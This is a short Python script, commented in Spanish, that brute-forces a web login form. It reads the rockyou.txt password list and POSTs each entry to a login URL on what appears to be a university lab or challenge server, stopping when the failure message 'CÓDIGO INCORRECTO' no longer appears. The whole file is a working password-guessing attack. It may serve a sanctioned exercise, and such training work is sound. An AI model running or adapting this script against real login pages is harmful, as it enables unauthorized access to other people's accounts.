import requests

# URL del formulario de login
url = 'https://caritatriste.dsa.linti.unlp.edu.ar/butter'

# Ruta al diccionario rockyou.txt
diccionario = './rockyou.txt'

with open(diccionario, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()

        # Enviamos la petición POST
        response = requests.post(url, data={
            'password': password
        })

        # Si el login fue exitoso, la respuesta no tendrá "incorrectos"
        if "CÓDIGO INCORRECTO" not in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            break

        # Mostrar progreso cada 100 intentos
        if i % 100 == 0:
            print(f"Probadas {i} contraseñas...")

    else:
        print("[-] Contraseña no encontrada en el diccionario.")
